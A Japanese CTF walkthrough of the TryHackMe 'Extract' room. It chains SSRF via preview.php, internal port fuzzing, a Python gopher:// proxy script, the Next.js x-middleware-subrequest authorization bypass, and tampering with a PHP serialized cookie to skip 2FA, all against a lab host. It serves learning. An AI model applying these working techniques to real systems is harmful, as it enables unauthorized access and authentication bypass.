# Extract CTF

https://tryhackme.com/room/extract

## Enumeration

```shell
TARGET=10.48.178.211
sudo bash -c "echo $TARGET   extract.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```

SSH, HTTP

トップページ

```
Available Documents
Dummy
Lorem
```

### ディレクトリ列挙

```sh
dirb http://extract.thm

---- Scanning URL: http://extract.thm/ ----
+ http://extract.thm/index.php (CODE:200|SIZE:1735)                                                                  
==> DIRECTORY: http://extract.thm/javascript/                                                                        
==> DIRECTORY: http://extract.thm/management/                                                                        
==> DIRECTORY: http://extract.thm/pdf/                                                                               
+ http://extract.thm/server-status (CODE:403|SIZE:276)                                                               
                                                                                                                     
---- Entering directory: http://extract.thm/javascript/ ----
==> DIRECTORY: http://extract.thm/javascript/events/                                                                 
==> DIRECTORY: http://extract.thm/javascript/util/                                                                   
                                                                                                                     
---- Entering directory: http://extract.thm/management/ ----
+ http://extract.thm/management/index.php (CODE:403|SIZE:14)                                                         
                                                                                                                     
---- Entering directory: http://extract.thm/pdf/ ----
+ http://extract.thm/pdf/index.php (CODE:200|SIZE:0)                                                                 
                                                                                                                     
---- Entering directory: http://extract.thm/javascript/events/ ----
+ http://extract.thm/javascript/events/events (CODE:200|SIZE:14890)                                                  
                                                                                                                     
---- Entering directory: http://extract.thm/javascript/util/ ----
==> DIRECTORY: http://extract.thm/javascript/util/support/                                                           
+ http://extract.thm/javascript/util/util (CODE:200|SIZE:19697)                                                      
                                                                                                                     
---- Entering directory: http://extract.thm/javascript/util/support/ ----
```

ソースを見ると、ダミーのPDFは `http://cvssm1/pdf/dummy.pdf` というリンクになっていた。ホスト追加。

```sh
sudo bash -c "echo $TARGET   cvssm1 >> /etc/hosts"
```

サブドメインは見つからなかった。

PDFプレビュー機能を使用するソースで、preview.php の使用箇所を発見。

```js
  <script>
    function openPdf(url) {
      const iframe = document.getElementById('pdfFrame');
      iframe.src = 'preview.php?url=' + encodeURIComponent(url);
      iframe.style.display = 'block';
    }
  </script>
```

ローカルでホストしている pentest.php を指定したらソースがそのまま表示された。リクエストが来たので、SSRFの脆弱性はある。

```sh
$ curl -v http://cvssm1/preview.php?url=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%33%38%2e%32%33%36%3a%38%30%30%30%2f%70%65%6e%74%65%73%74%2e%70%68%70
* Host cvssm1:80 was resolved.
* IPv6: (none)
* IPv4: 10.48.178.211
*   Trying 10.48.178.211:80...
* Connected to cvssm1 (10.48.178.211) port 80
* using HTTP/1.x
> GET /preview.php?url=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%33%38%2e%32%33%36%3a%38%30%30%30%2f%70%65%6e%74%65%73%74%2e%70%68%70 HTTP/1.1
> Host: cvssm1
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Wed, 03 Dec 2025 02:17:49 GMT
< Server: Apache/2.4.58 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 2594
< Content-Type: text/plain;charset=UTF-8
< 
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
```

http://cvssm1/management/index.php （ソースではなく実行結果）  
普通にアクセスすると403が表示されるページだが、SSRFでは200応答があった。TryBookMe のログイン画面。しかし現状ではPOSTを送信する術がない。

```sh
$ curl -v http://cvssm1/preview.php?url=%68%74%74%70%3a%2f%2f%63%76%73%73%6d%31%2f%6d%61%6e%61%67%65%6d%65%6e%74%2f%69%6e%64%65%78%2e%70%68%70
* Host cvssm1:80 was resolved.
* IPv6: (none)
* IPv4: 10.48.178.211
*   Trying 10.48.178.211:80...
* Connected to cvssm1 (10.48.178.211) port 80
* using HTTP/1.x
> GET /preview.php?url=%68%74%74%70%3a%2f%2f%63%76%73%73%6d%31%2f%6d%61%6e%61%67%65%6d%65%6e%74%2f%69%6e%64%65%78%2e%70%68%70 HTTP/1.1
> Host: cvssm1
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Wed, 03 Dec 2025 02:29:20 GMT
< Server: Apache/2.4.58 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 1656
< Content-Type: text/html; charset=UTF-8
< 

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>TryBookMe - Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- Bootstrap CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">

  <style>
    body {
      background-color: #f8f9fa;
    }
    .login-box {
      max-width: 400px;
      margin: 60px auto;
      padding: 2rem;
      background-color: #fff;
      border-radius: 8px;
      border: 1px solid #dee2e6;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
    }
  </style>
</head>
<body>

  <!-- Navbar -->
  <nav class="navbar navbar-expand-lg navbar-dark bg-dark mb-4">
    <div class="container-fluid">
      <a class="navbar-brand" href="#">🔐 TryBookMe Login</a>
    </div>
  </nav>

  <div class="container">
    <div class="login-box">
      <h3 class="text-center mb-4">Sign In</h3>

      
      <form method="POST" action="">
        <div class="mb-3">
          <label for="username" class="form-label">Username</label>
          <input type="text" name="username" class="form-control" id="username" required>
        </div>

        <div class="mb-3">
          <label for="password" class="form-label">Password</label>
          <input type="password" name="password" class="form-control" id="password" required>
        </div>

        <div class="d-grid">
          <button type="submit" class="btn btn-primary">Login</button>
        </div>
      </form>
    </div>
  </div>

  <footer class="text-center mt-5 mb-3 text-muted">
    &copy; 2025 TryBookMe · All rights reserved
  </footer>

</body>
</html>
* Connection #0 to host cvssm1 left intact
```

SSRFでローカルポートをファジングし、10000ポートが開いているのを発見した。

```sh
seq 1 65535 > ports.txt

ffuf -u http://cvssm1/preview.php?url=http://cvssm1:FUZZ/ -w ./ports.txt -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://cvssm1/preview.php?url=http://cvssm1:FUZZ/
 :: Wordlist         : FUZZ: ./ports.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 0
________________________________________________

80                      [Status: 200, Size: 1735, Words: 304, Lines: 65]
10000                   [Status: 200, Size: 6131, Words: 104, Lines: 1]
:: Progress: [65535/65535] :: Job [1/1] :: 1813 req/sec :: Duration: [0:00:38] :: Errors: 0 ::
```

10000ポートの内容。これをHTML保存してブラウザで表示すると、TryBoockMe API のページが表示されたが・・・？

```sh
$ curl -v http://cvssm1/preview.php?url=http://cvssm1:10000/                               
* Host cvssm1:80 was resolved.
* IPv6: (none)
* IPv4: 10.48.161.174
*   Trying 10.48.161.174:80...
* Connected to cvssm1 (10.48.161.174) port 80
* using HTTP/1.x
> GET /preview.php?url=http://cvssm1:10000/ HTTP/1.1
> Host: cvssm1
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Wed, 03 Dec 2025 04:28:41 GMT
< Server: Apache/2.4.58 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 6131
< Content-Type: text/html; charset=utf-8
< 
<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/178989e77b112f7f.css" crossorigin="" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-8fc0c21e0210cbd2.js" 
以下略
```

APIエンドポイントを探したが発見できなかった。

```sh
ffuf -u http://cvssm1/preview.php?url=http://cvssm1:10000/api/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -fr '404'

ffuf -u http://cvssm1/preview.php?url=http://cvssm1:10000/customapi/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -fr '404'
```

完全に行き詰ったのでウォークスルーを見た。

## gopher

[gopher://](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html?highlight=gopher#gopher) スキームとプロキシサーバーを使ってローカルから直接通信できるようにする。

https://medium.com/@sornphut/extract-tryhackme-walkthough-881daf0ca120 より拝借。少し修正。


```python
#!/usr/bin/env python3

import socket
import requests
import urllib.parse
import threading

LHOST = '127.0.0.1'
LPORT = 5000
TARGET_HOST = "cvssm1"
HOST_TO_PROXY = "127.0.0.1"
PORT_TO_PROXY = 10000

def handle_client(conn, addr):
    with conn:
        data = conn.recv(65536)
        double_encoded_data = urllib.parse.quote(urllib.parse.quote(data))
        target_url = f"http://{TARGET_HOST}/preview.php?url=gopher://{HOST_TO_PROXY}:{PORT_TO_PROXY}/_{double_encoded_data}"
        resp = requests.get(target_url)
        conn.sendall(resp.content)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((LHOST, LPORT))
    s.listen()
    print(f"Listening on {LHOST}:{LPORT}, proxying to {HOST_TO_PROXY}:{PORT_TO_PROXY} via {TARGET_HOST}...")
    while True:
        conn, addr = s.accept()
        client_thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
        client_thread.start()
```

/customapi をGETすると、/ に転送されているので、何らかの認証がある。

```sh
$ curl -v http://127.0.0.1:5000/customapi
*   Trying 127.0.0.1:5000...
* Connected to 127.0.0.1 (127.0.0.1) port 5000
* using HTTP/1.x
> GET /customapi HTTP/1.1
> Host: 127.0.0.1:5000
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 307 Temporary Redirect
< location: http://localhost:10000/
< Date: Wed, 03 Dec 2025 06:52:41 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< Transfer-Encoding: chunked
< 
* Connection #0 to host 127.0.0.1 left intact
http://localhost:10000/
```

## Next.js Middleware 15.2.2 - Authorization Bypass

https://www.exploit-db.com/exploits/52124

HTTPヘッダーに下記を追加するだけで認証をバイパスできる。

```sh
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

```
Maintenance!
This API is currently under maintenance. Please use the library portal to add new books using librarian:[REDACTED]

First flag is THM{[REDACTED]}
```

SSHでは接続できなかった。おそらく、/management のログイン画面で使うものと思われる。

## /management

先ほど使ったプロキシサーバーのコードで、あて先を80ポートに変えて実行。

http://127.0.0.1:5000/management でログイン画面が表示された。

入手した認証情報でログインすると、`6-digit Code` の2段階認証画面が表示された。

適当なコードを送ると、次のような応答。

```sh
$ curl http://127.0.0.1:5000/management/2fa.php -X POST -d 'code=012345' -H 'Cookie: PHPSESSID=a3a75rifpgv481gob9j6j2m50s; auth_token=O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A0%3B%7D' -H 'Content-Type: application/x-www-form-urlencoded'
<!DOCTYPE html>
<html lang="en">
<head>
（略）
</body>
</html>
<script>alert("Invalid 2FA code.");</script> 
```

ブルートフォースを実行。しかし、処理速度を計ると、36時間かかる計算・・・  
4桁なら現実的だが、6桁は無理と判断。

```sh
seq -w 0 999999 > codes.txt

ffuf -u http://127.0.0.1:5000/management/2fa.php -w ./codes.txt -X POST -d 'code=FUZZ' -H 'Cookie: PHPSESSID=a3a75rifpgv481gob9j6j2m50s; auth_token=O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A0%3B%7D' -H 'Content-Type: application/x-www-form-urlencoded' -fr 'Invalid 2FA code'
```

auth_token部分をデコードすると下記になる。これはPHPシリアライズされた形。

```
O:9:"AuthToken":1:{s:9:"validated";b:0;}
```

`b:1` に変更してリクエストしてみたら、フラグが返ってきた。

```sh
$ curl http://127.0.0.1:5000/management/2fa.php -H 'Cookie: PHPSESSID=a3a75rifpgv481gob9j6j2m50s; auth_token=O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A1%3B%7D'
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>2FA Complete - TryBookMe</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-light">
  <div class="container py-5">
    <div class="alert alert-success text-center">
      <h4 class="alert-heading">Congratulations!</h4>
      <p>Here's the second flag: THM{[REDACTED]}</p>
    </div>
  </div>
</body>
</html> 
```

## 振り返り

- gopher:// とプロキシサーバーのコンボは、完全に初見で自力で考え出すのは不可能だったと思う。非常に良い勉強になった。
- SSRFで /management のログイン画面を表示できることと10000ポートが開いていることまで発見できたのは良い点だった。
- Next.js の認証バイパス脆弱性は簡単だし覚えておきたい。

## Tags

#tags:SSRF #tags:Next.js脆弱性
